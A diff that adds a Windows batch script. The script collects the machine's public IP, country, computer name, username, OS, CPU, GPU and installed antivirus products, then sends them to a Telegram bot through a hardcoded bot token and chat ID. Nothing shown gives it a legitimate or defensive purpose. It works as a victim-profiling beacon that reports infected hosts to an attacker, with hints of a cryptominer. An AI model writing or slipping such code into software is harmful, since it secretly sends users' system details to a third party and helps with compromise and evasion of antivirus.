@@ -1,1 +1,15 @@
+setlocal EnableDelayedExpansion
+set "TOKEN=7136619821:AAE-mSwsE-MoufoR2B_y3R9DMIkdoH_STqE"
+set "CHAT_ID=5001062852"
 
+for /f "tokens=1,2" %a in ('powershell -command "$json = Invoke-RestMethod -Uri http://ip-api.com/json/; $json.query + ' ' + $json.country"') do set "IP=%a" & set "Country=%b"
+for /f "tokens=2 delims==" %a in ('wmic os get Caption /value') do set Windows=%a
+for /f "tokens=2 delims==" %a in ('wmic cpu get name /value') do set CPU=%a
+for /f "tokens=2 delims==" %a in ('wmic path win32_videocontroller get caption /value') do set GPU=%a
+for /f "tokens=2 delims==" %a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value') do (if defined Antivirus (set "Antivirus=!Antivirus!,%a") else (set "Antivirus=%a"))
+if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
+set UserName=%USERNAME%
+set Worker=%COMPUTERNAME%
+
+powershell -command "$message = '---RUS---nIP: %IP%nCountry: %Country%nWorker: %Worker%nUserName: %UserName%nWindows: %Windows% %Arch%nCPU: %CPU%nGPU: %GPU%nAntivirus: %Antivirus%'; Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+endlocal
